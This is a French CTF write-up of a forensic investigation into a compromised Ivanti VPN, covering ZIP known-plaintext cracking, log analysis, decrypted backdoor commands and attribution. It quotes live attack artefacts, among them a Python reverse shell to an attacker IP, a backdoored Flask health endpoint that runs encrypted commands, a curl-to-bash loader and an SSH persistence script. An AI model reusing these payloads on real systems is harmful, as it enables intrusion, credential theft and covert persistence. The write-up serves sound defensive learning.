# Horreur, malheur

## Index
[Horreur, malheur 1/5 - Archive chiffrée](https://github.com/Maksence/write-ups/blob/main/fcsc2024/Horreur_malheur_1-5.md#horreur-malheur-15---archive-chiffr%C3%A9e)

[Horreur, malheur 2/5 - Accès initial](https://github.com/Maksence/write-ups/blob/main/fcsc2024/Horreur_malheur_1-5.md#horreur-malheur-25---archive-chiffr%C3%A9e)

[Horreur, malheur 3/5 - Simple persistance](https://github.com/Maksence/write-ups/blob/main/fcsc2024/Horreur_malheur_1-5.md#horreur-malheur-35---simple-persistance)

[Horreur, malheur 4/5 - Pas si simple persistance](https://github.com/Maksence/write-ups/blob/main/fcsc2024/Horreur_malheur_1-5.md#horreur-malheur-45---pas-si-simple-persistance)

[Horreur, malheur 5/5 - Un peu de CTI](https://github.com/Maksence/write-ups/blob/main/fcsc2024/Horreur_malheur_1-5.md#horreur-malheur-55---un-peu-de-cti)
___
## Enoncé Global:

>Introduction commune à la série Horreur, malheur
Vous venez d'être embauché en tant que Responsable de la Sécurité des Systèmes d'Information (RSSI) d'une entreprise stratégique.
En arrivant à votre bureau le premier jour, vous vous rendez compte que votre prédécesseur vous a laissé une clé USB avec une note dessus : **VPN compromis (intégrité). Version 22.3R1 b1647.**
> Note : La première partie (Archive chiffrée) débloque les autres parties, à l'exception de la seconde partie (Accès initial) qui peut être traitée indépendamment. Nous vous recommandons de traiter les parties dans l'ordre.


## Horreur, malheur 1/5 - Archive chiffrée

>Sur la clé USB, vous trouvez deux fichiers : une archive chiffrée et les journaux de l'équipement. Vous commencez par lister le contenu de l'archive, dont vous ne connaissez pas le mot de passe. Vous gardez en tête un article que vous avez lu : il paraît que les paquets installés sur l'équipement ne sont pas à jour...
Le flag est le mot de passe de l'archive.
> Remarque : Le mot de passe est long et aléatoire, inutile de chercher à le bruteforcer.
> 
> Fichier: archive.encrypted

### Write-up:
On nous donne donc une archive chiffrée. On regarde ce qu'on a plus précisément comme type de fichier et de chiffrement.

```shell
$ file archive.encrypted 
archive.encrypted: Zip archive data, at least v2.0 to extract, compression method=deflate
```
Zip compressé en mode deflate. Jetons un coup d'oeil aux fichiers de l'archive
```shell
$ zipinfo archive.encrypted
Archive:  archive.encrypted
Zip file size: 65470 bytes, number of entries: 3
-rw-r--r--  3.0 unx    64697 BX defN 24-Mar-15 14:58 tmp/temp-scanner-archive-20240315-065846.tgz
-rwxr-xr-x  3.0 unx      194 TX defN 22-Dec-05 16:06 home/VERSION
-rw-r--r--  3.0 unx       33 TX defN 24-Mar-15 14:32 data/flag.txt
3 files, 64924 bytes uncompressed, 64842 bytes compressed:  0.1%
```
Vu les indices de l'énoncé on suppose qu'il doit exister une vulnérabilité liée à ce mode de chiffrement. 
En cherchant, on tombe effectivement sur une attaque de [Biham and Kocher](https://www.acceis.fr/cracking-encrypted-archives-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/)
> Older encrypted ZIP archives can suffer from Biham and Kocher plaintext attack if they use the ZipCrypto Store encryption method.

Une attaque de clair connu. On regarde plus en détail notre méthode de chiffrement

```shell
$ 7z l -slt archive.encrypted | grep Method
Method = ZipCrypto Deflate
Method = ZipCrypto Deflate
Method = ZipCrypto Deflate
```
Zip Deflate -> nos fichiers ont été compressés avant le chiffrement, comme le mentionne le site. 
> It is also possible if the archive use ZipCrypto Deflate but it is harder since files are compressed before encryption.

Cela complexifie grandement la tâche, car il est peu probable de trouver le bon plaintext une fois compressé sans connaître le contenu complet d'un fichier.

Regardons cependant de quoi à-t-on besoin pour cette attaque?

> To conduct this attack, it requires at least 12 bytes of known plaintext and at least 8 of them must be contiguous.

12 bytes minimum, et on peut même récupérer un byte supplémentaire grâce au CRC situé juste avant le début du fichier.

Donc il nous faut au minimum 11 bytes de plaintext, dont 8 contiguës. 

Première idée: on connaît le format du flag: FCSC{...}. En supposant que le flag est sous cette forme dans le fichier data/flag.txt, on pourrait avoir un plaintext.

Mais même avec cette hypothèse, "FCSC{" ne fait que 5 bytes et il en faut 8. Même avec le CRC, cela demanderait de bruteforce les 2 premiers caractères du flag. Tout ça sans avoir l'assurance que le flag soit sous cette forme dans le fichier. Pire encore, comme mentionné précédemment les fichiers ont été compressés avant le chiffrement, ce qui rend la tâche encore plus hardue voir impossible. Bref, fausse bonne idée.

Donc on explore l'autre option, le fichier home/VERSION.
Dans l'énoncé on nous parle de "VPN compromis (intégrité). Version 22.3R1 b1647". Une recherche internet plus tard, on tombe sur un rapport d'une [exploitation de vulnérabilité sur Ivanti Pulse Connect Secure](https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce)

Si on télécharge une vm Pulse Connect Secure on pourrait savoir à quoi ressemble le contenu de /home/VERSION.
En plus dans ce rapport il y a le lien d'une [vm vmware](https://application.ivanti.com/SSG/ICS/ps-ics-vmware-isa-v-22.3r1.0-b1647-package.zip). 
Mais je n'ai pas réussi à la lancer du premier coup, et n'ai pas souhaité perdre du temps sur VMware.

Plus simplement, en relisant dans ce même rapport les auteurs montrent leur RCE avec les commandes suivantes
```shell
$ nc -lv 192.168.1.197 4444
sh: cannot set terminal process group (-1): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.1# id
id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# cat /home/VERSION
cat /home/VERSION
export DSREL_MAJOR=22
export DSREL_MINOR=3
export DSREL_MAINT=1
export DSREL_DATAVER=4802
export DSREL_PRODUCT=ssl-vpn
export DSREL_DEPS=ive
export DSREL_BUILDNUM=1647
export DSREL_COMMENT="R1"
```
Ah! En plus ça semble matcher avec notre Version 22.3R1 b1647. Par contre aucune idée de ce à quoi corresponde le paramètre DSREL_DATAVER=4802. 
On essaie quand même:
```shell
$ cat VERSION 
export DSREL_MAJOR=22
export DSREL_MINOR=3
export DSREL_MAINT=1
export DSREL_DATAVER=4802
export DSREL_PRODUCT=ssl-vpn
export DSREL_DEPS=ive
export DSREL_BUILDNUM=1647
export DSREL_COMMENT="R1"

$ $ zip version.zip VERSION 
  adding: VERSION (deflated 44%)

$ ./bkcrack-1.6.1-Linux/bkcrack -C archive.encrypted -c 'home/VERSION' -p VERSION -P version.zip 
bkcrack 1.6.1 - 2024-01-22
[17:58:31] Z reduction using 101 bytes of known plaintext
100.0 % (101 / 101)
[17:58:31] Attack on 83134 Z values at index 6
Keys: 6ed5a98a a1bb2e0e c9172a2f
67.4 % (56043 / 83134)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 56043
[17:59:35] Keys
6ed5a98a a1bb2e0e c9172a2f
```

Ca a marché ! Maintenant il suffit de crééer une archive avec ces clés et le mot de passe de notre choix 
```shell
 ./bkcrack-1.6.1-Linux/bkcrack -C archive.encrypted -k 6ed5a98a a1bb2e0e c9172a2f -U archive.zip noraj
bkcrack 1.6.1 - 2024-01-22
[18:01:01] Writing unlocked archive archive.zip with password "noraj"
100.0 % (3 / 3)
Wrote unlocked archive.
```

```shell
$ cat data/flag.txt 
50c53be3eece1dd551bebffe0dd5535c
 ```

Flag:
```diff
+ FCSC{50c53be3eece1dd551bebffe0dd5535c}
```




## Horreur, malheur 2/5 - Archive chiffrée

>Sur la clé USB, vous trouvez deux fichiers : une archive chiffrée et les journaux de l’équipement. Vous focalisez maintenant votre attention sur les journaux. L’équipement étant compromis, vous devez retrouver la vulnérabilité utilisée par l’attaquant ainsi que l’adresse IP de ce dernier.
>>Le flag est au format : FCSC{CVE-XXXX-XXXXX:<IP_ADDRESS>}.
>Fichiers: horreur-malheur.tar.xz

Ce challenge est un peu séparé des autres car il pouvait être réalisé indépendamment de la résolution de l'étape 1.

On nous fournit une archive contenant les fichiers suivants:

Grâce au rapport utilisé dans la partie 1, on sait déjà qu'on a à faire à la CVE-2023-46805 (Authentication Bypass) ou la CVE-2024-21887 (Remote Command Execution).

On cherche donc en priorité l'adresse IP de l'attaquant

```shell
$ tree
.
└── data
    └── var
        └── dlogs
            ├── aaaservices_rest_server.log
            ├── aaaservices_rest_server.log.old
            ├── cav_webserv.log
            ├── cav_webserv.log.old
            ├── config_rest_server.log
            ├── config_rest_server.log.old
            ├── custom_actions_rest_server.log
            ├── custom_actions_rest_server.log.old
            ├── debuglog
            ├── debuglog.old
            ├── enduserportal_rest_server.log
            ├── enduserportal_rest_server.log.old
            ├── esapdata_rest_server.log
            ├── esapdata_rest_server.log.old
            ├── gwpolicy_rest_server.log
            ├── gwpolicy_rest_server.log.old
            ├── monrestserver.log
            ├── namedusersrestserver.log
            ├── namedusersrestserver.log.old
            ├── nodemonlog
            ├── nodemonlog.old
            ├── session_rest_server.log
            ├── system_import_debuglog
            ├── tasks_rest_server.log
            ├── tasks_rest_server.log.old
            ├── ueba_webserv.log
            └── user_import_debuglog

4 directories, 27 files
```
Des logs de serveur. 
On grep pour trouver des adresses IPs, en excluant les adresses locales
```shell
$ grep -r -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -v 172 | grep -v 127
```
et on tombe sur une adresse ip intéressante...
```shell
$ grep -r 20.13.3.0
data/var/dlogs/nodemonlog.old:21969     1  0.0  0.0 S   452   4852  3808 /bin/sh -c /home/perl5/bin/perl /home/perl/AwsAzureTestConnection.pl ;python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.13.3.0",4444));subprocess.call(["/bin/sh","-i
data/var/dlogs/nodemonlog.old:21971 21969  0.0  0.0 S  2296   9532  7972 python -c import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.13.3.0",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
[...]
```
> ;python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span style="color:red">"20.13.3.0"</span>,4444));subprocess.call(["/bin/sh","-i


Un revshell avec l'adresse IP de l'attaquant. On est dans le cas d'une RCE, donc de la CVE-2024-21887.

```diff
+flag: FCSC{CVE-2024-21887:20.13.3.0}
```

## Horreur, malheur 3/5 - Simple persistance

>Vous avez réussi à déchiffrer l’archive. Il semblerait qu’il y ait dans cette archive une autre archive, qui contient le résultat du script de vérification d’intégrité de l’équipement.
> À l’aide de cette dernière archive et des journaux, vous cherchez maintenant les traces d’une persistance déposée et utilisée par l’attaquant.

Retour sur notre archive.


```shell
$ cd tmp/
$ tar -xvf temp-scanner-archive-20240315-065846.tgz 
home/bin/configencrypt
home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg
$ tree
.
├── bin
│    └── configencrypt
└── venv3
    └── lib
        └── python3.6
            └── site-packages
                └── cav-0.1-py3.6.egg

```
Le fichier bin/configencrypt contient juste le script utilisé pour chiffrer l'archive. 

Le fichier cav-0.1-py3.6.egg est plus intéressant. Mais qu'est-ce qu'un .egg ? https://stackoverflow.com/questions/2051192/what-is-a-python-egg
>The .egg file is a distribution format for Python packages.

> Same concept as a .jar file in Java, it is a .zip file with some metadata files renamed .egg, for distributing code as bundles.

Juste une archive python donc:
```shell
$ file cav-0.1-py3.6.egg
cav-0.1-py3.6.egg: Zip archive data, at least v2.0 to extract, compression method=deflate

$ unzip cav-0.1-py3.6.egg
```
14 directories, 67 files -> beaucoup de fichiers.

Par réflexe on grep "flag":
```shell
[~/site-packages]$ grep -r "flag"
cav/api/resources/health.py:            with open("/data/flag.txt", "r") as handle:
cav/models/base.py:from sqlalchemy.orm.attributes import flag_modified
cav/models/base.py:        flag_modified(self, "data")
grep: cav/models/__pycache__/base.cpython-36.pyc : fichiers binaires correspondent
```

Le fichier "health.py" est très suspicieux.

```python
$ cat health.py 
#
# Copyright (c) 2018 by Pulse Secure, LLC. All rights reserved
#
import base64
import subprocess
import zlib
import simplejson as json
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from flask import request
from flask_restful import Resource


class Health(Resource):
    """
    Handles requests that are coming for client to post the application data.
    """

    def get(self):
        try:
            with open("/data/flag.txt", "r") as handle:
                dskey = handle.read().replace("\n", "")
            data = request.args.get("cmd")
            if data:
                aes = AES.new(dskey.encode(), AES.MODE_ECB)
                cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
                result = subprocess.getoutput(cmd)
                if not isinstance(result, bytes): result = str(result).encode()
                result = base64.b64encode(aes.encrypt(pad(zlib.compress(result), 32))).decode()        
                return result, 200
        except Exception as e:
            return str(e), 501

```

Il semble donc que les payloads sont chiffrés en AES ECB avec la clé dans /data/flag.txt, qui était la solution de l'étape 1. Donc il suffit de trouver les payloads envoyés à l'endpoint /health.

On retourne dans les logs et on grep les requêtes à l'endpoint.

```shell
$ grep -r -P -o 'health\?cmd.{0,200}'
dlogs/cav_webserv.log:health?cmd=DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA%3D => generated 47 bytes in 83 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 998)
dlogs/cav_webserv.log:health?cmd=K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ%3D => generated 175 bytes in 74 msecs (HTTP/1.1 200) 2 headers in 72 bytes (3 switches on core 998)
dlogs/cav_webserv.log:health?cmd=/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ%3D%3D => generated 91 bytes in 74 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 997)
dlogs/cav_webserv.log:health?cmd=Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA%3D%3D => generated 1755 bytes in 80 msecs (HTTP/1.1 200) 2 headers in 73 bytes (3 switches on core 999)
dlogs/cav_webserv.log:health?cmd=yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ%2B74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ%2B/o%3D => generated 47 byte
dlogs/cav_webserv.log:health?cmd=E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7%2Byv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT => generated 47 bytes in 76 msecs (HTTP/1.1 200) 2 headers in 71 byt
dlogs/cav_webserv.log:health?cmd=7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn%2BXeiWHpCWr%2ByyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD%2B0nZc8%3D => generated 47 by
dlogs/cav_webserv.log:health?cmd=WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz%2BJxmwQdxnJwNg%3D%3D => generated 47 bytes in 53732 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 997)
dlogs/cav_webserv.log:health?cmd=G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM%3D => generated 47 bytes in 73 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 999)
dlogs/cav_webserv.log:health?cmd=QV2ImqgrjrL7%2BtofpO12S9bqgDCRHYXGJwaOIihb%2BNI%3D => generated 91 bytes in 72 msecs (HTTP/1.1 200) 2 headers in 71 bytes (3 switches on core 999)
```

Maintenant on écrit un script python pour déchiffrer, en pensant à url-decoder:
```python
import base64
import zlib
from Crypto.Cipher import AES
def decode():
        try:
            with open("flag.txt", "r") as handle:
                dskey = handle.read().replace("\n", "")
            list = ["DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA%3D","K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ%3D","/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ%3D%3D","Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA%3D%3D","yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ%2B74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ%2B/o%3D","E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7%2Byv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT","7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn%2BXeiWHpCWr%2ByyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD%2B0nZc8%3D","WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz%2BJxmwQdxnJwNg%3D%3D","G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM%3D","QV2ImqgrjrL7%2BtofpO12S9bqgDCRHYXGJwaOIihb%2BNI%3D"]

            for data in list:
                #url decode
                data = data.replace("%2B", "+").replace("%2F", "/").replace("%3D", "=")
                if data:
                    aes = AES.new(dskey.encode(), AES.MODE_ECB)
                    cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
                    #can't use .decode as it interprets the \n as newline
                    print(cmd.decode().replace('\n', '\\n'))
            return 1
        except Exception as e:
            return str(e), 501
decode()
```
```shell
$ python3 decode.py
id
ls /
echo FCSC{6cd63919125687a10d32c4c8dd87a5d0c8815409}
cat /data/runtime/etc/ssh/ssh_host_rsa_key
/home/bin/curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a
cat /tmp/a | grep "name" | /pkg/uniq | cut -d ":" -f 2 | cut -d '"' -f 2 | tr -d '\n' | grep -o . | tac | tr -d '\n'  > /tmp/b
a=`cat /tmp/b`;b=${a:4:32};c="https://api.github.com/gists/${b}";/home/bin/curl -k -s ${c} | grep 'raw_url' | cut -d '"' -f 4 > /tmp/c
c=`cat /tmp/c`;/home/bin/curl -k ${c} -s | bash
rm /tmp/a /tmp/b /tmp/c
nc 146.0.228.66:1337
```
```diff
+ FCSC{6cd63919125687a10d32c4c8dd87a5d0c8815409}
```

## Horreur, malheur 4/5 - Pas si simple persistance


>Vous remarquez qu’une fonctionnalité built-in de votre équipement ne fonctionne plus et vous vous demandez si l’attaquant n’a pas utilisé la première persistance pour en installer une seconde, moins “visible”…
>
>Vous cherchez les caractéristiques de cette seconde persistance : protocole utilisé, port utilisé, chemin vers le fichier de configuration qui a été modifié, chemin vers le fichier qui a été modifié afin d’établir la persistance.
>> Le flag est au format : FCSC{<protocole>:<port>:<absolute_path_edited_conf>:<absolute_path_edited_file_persistence>}

    
On continue notre investigation, on recrée localement le contenu des variables "a" ,"b", "c" en prenant soin de ne pas exécuter de payload malveillant sur notre machine

```shell
$ cat a b c
degbf1b75ea202a92df5b9f151535b7f19fez4x
f1b75ea202a92df5b9f151535b7f19fe
https://gist.githubusercontent.com/joke-finished/f1b75ea202a92df5b9f151535b7f19fe/raw/ae0bca6e36064e1c810aa55960a6e30b94f64fca/gistfile1.txt
```
On télécharge le gistfile et on analyse
```python
$ cat gistfile1.txt 
#Change le port dans le fichier de configuration du serveur ssh
sed -i 's/port 830/port 1337/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
##Désactive l'éxecution automatique d'une commande lors d'une connexion ssh (désactive une mesure de sécurité)
sed -i 's/ForceCommand/#ForceCommand/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
##Active l'authentification par clé publique
echo "PubkeyAuthentication yes" >> /data/runtime/etc/ssh/sshd_server_config
##Ajoute un fichier de clés autorisés
echo "AuthorizedKeysFile /data/runtime/etc/ssh/ssh_host_rsa_key.pub" >> /data/runtime/etc/ssh/sshd_server_config
##Tue le démon sshd
pkill sshd-ive > /dev/null 2>&1
##Décompresse un fichier de backup
gzip -d /data/pkg/data-backup.tgz > /dev/null 2>&1
##Ajoute le fichier de configuration modifié à l'archive 
tar -rf /data/pkg/data-backup.tar /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
##Compresse l'archive
gzip /data/pkg/data-backup.tar > /dev/null 2>&1
##Remplace le fichier de backup
mv /data/pkg/data-backup.tar.gz /data/pkg/data-backup.tgz > /dev/null 2>&1
```

On a donc notre flag:
FCSC{<protocole>:<port>:<absolute_path_edited_conf>:<absolute_path_edited_file_persistence>}
```diff
+ FCSC{ssh:1337:/data/runtime/etc/ssh/sshd_server_config:/data/pkg/data-backup.tgz}
```

## Horreur, malheur 5/5 - Un peu de CTI

> Vous avez presque fini votre analyse ! Il ne vous reste plus qu'à qualifier l'adresse IP présente dans la dernière commande utilisée par l'attaquant.
Vous devez déterminer à quel groupe d'attaquant appartient cette adresse IP ainsi que l'interface de gestion légitime qui était exposée sur cette adresse IP au moment de l'attaque.
>>Le flag est au format : FCSC{UNC:service}.
    
>Remarque : Il s’agit d’une véritable adresse IP malveillante, n’interagissez pas directement avec cette adresse IP.

    
L'étape qui m'a laissée la plus perplexe, et ce n'est pas faute d'avoir cherché.

Déjà, le numéro de Uncategorized (UNC) Threat Groups:    
En cherchant des mots clés liés à notre CVE et à un endpoint health.py, on trouve https://cloud.google.com/blog/topics/threat-intelligence/investigating-ivanti-zero-day-exploitation/?hl=en
On recoupe avec d'autres sources (https://www.mandiant.com/resources/blog/investigating-ivanti-zero-day-exploitation
https://www.mycert.org.my/portal/details?menu=431fab9c-d24c-4a27-ba93-e92edafdefa5&id=e20dabb6-a50d-4575-8bc9-8b6e137de20d) et on est convaincu qu'on a l'acteur: **UNC5221**
    
Maintenant l'interface de gestion/service... Je n'ai pas trouvé. 
    
L'ip de l'attaquant est facilement identifiée par la dernière commande trouvée dans l'étape 3, mais je n'ai pas relevé le bon service 
>nc 146.0.228.66:1337

Voici une liste des flags tentés, tentatives plus ou moins désespérées (la casse n'importe pas):
- FCSC{UNC5221:HTTP}
- FCSC{UNC5221:ssh}
- FCSC{UNC5221:sshd}
- FCSC{UNC5221:sshd-ive}
- FCSC{UNC5221:krb314}
- FCSC{UNC5221:areekaweb}
- FCSC{UNC5221:WarpWire}
- FCSC{UNC5221:ChainLine}

Quelques sites/outils intéressants où j'ai cherché:
- [Shodan](https://www.shodan.io/)
- [OpenCTI](https://demo.opencti.io/dashboard/observations/observables/69e7f0ab-d1a6-4cb0-870e-7c3bc40ccfd8)
- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [AlienVault](https://otx.alienvault.com/indicator/ip/146.0.228.66)
- dig
- nslookup
- whois
    
Le plus intéressant pour ce cas étant VirusTotal, où je suis passé [à côté de la réponse](https://www.virustotal.com/gui/ip-address/146.0.228.66/relations)

![VirusTotal](https://github.com/Maksence/write-ups/blob/main/fcsc2024/images/plesk.png)
    
Dans la section "Relations", une mention de "plesk.page". Je ne savais pas ce qu'était Plesk, mais une recherche internet m'aurait tout de suite donné la réponse: "Plesk -Innovative Hosting Control Panel". Le flag attendu était donc le suivant:
```diff
! FCSC{UNC5221:plesk}
```
Bref, je n'ai pas flag cette dernière étape mais cette série était très sympathique et instructive !
    
